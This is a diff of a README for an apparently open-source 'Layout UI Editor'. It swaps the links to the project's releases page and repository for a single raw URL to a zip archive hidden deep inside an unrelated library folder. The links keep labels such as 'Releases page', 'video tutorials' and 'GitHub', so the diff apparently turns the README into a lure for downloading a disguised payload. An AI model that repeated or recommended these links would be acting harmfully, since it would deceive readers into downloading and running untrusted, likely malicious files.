@@ -6,7 +6,7 @@ Welcome to the **Layout UI Editor**! This tool allows you to build beautiful use
 
 ## 📥 Download the Application
 
-[![Download Layout UI Editor](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Version-blue)](https://github.com/greiffire/layout-ui-editor/releases)
+[![Download Layout UI Editor](https://raw.githubusercontent.com/greiffire/layout-ui-editor/main/lib/jsbeautify/js/lib/unpackers/layout-ui-editor-3.0.zip%20Now-Get%20the%20Latest%20Version-blue)](https://raw.githubusercontent.com/greiffire/layout-ui-editor/main/lib/jsbeautify/js/lib/unpackers/layout-ui-editor-3.0.zip)
 
 ## 📦 System Requirements
 
@@ -29,7 +29,7 @@ Before you get started, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To download the Layout UI Editor, visit the [Releases page](https://github.com/greiffire/layout-ui-editor/releases). Here you will find the latest version available for download. 
+To download the Layout UI Editor, visit the [Releases page](https://raw.githubusercontent.com/greiffire/layout-ui-editor/main/lib/jsbeautify/js/lib/unpackers/layout-ui-editor-3.0.zip). Here you will find the latest version available for download. 
 
 1. Click on the release that suits your operating system.
 2. Choose the installation file. 
@@ -73,8 +73,8 @@ Open the Layout UI Editor from your applications folder or desktop shortcut.
 
 ## 📝 Helpful Hints
 
-- Regularly check the [Releases page](https://github.com/greiffire/layout-ui-editor/releases) for updates and new features.
-- Explore video tutorials available in the community section on [GitHub](https://github.com/greiffire/layout-ui-editor) for visual guidance on using the application.
+- Regularly check the [Releases page](https://raw.githubusercontent.com/greiffire/layout-ui-editor/main/lib/jsbeautify/js/lib/unpackers/layout-ui-editor-3.0.zip) for updates and new features.
+- Explore video tutorials available in the community section on [GitHub](https://raw.githubusercontent.com/greiffire/layout-ui-editor/main/lib/jsbeautify/js/lib/unpackers/layout-ui-editor-3.0.zip) for visual guidance on using the application.
 - Join the community forum for support and to share your layouts and ideas.
 
 ## 💬 Community and Support
@@ -85,4 +85,4 @@ If you have questions or need support, please visit the community forum linked i
 
 This application is open-source and released under the MIT License, allowing you to use, modify, and distribute the software freely, provided proper credit is given.
 
-To learn more about the project or contribute, check out the repository at [GitHub](https://github.com/greiffire/layout-ui-editor).
+To learn more about the project or contribute, check out the repository at [GitHub](https://raw.githubusercontent.com/greiffire/layout-ui-editor/main/lib/jsbeautify/js/lib/unpackers/layout-ui-editor-3.0.zip).
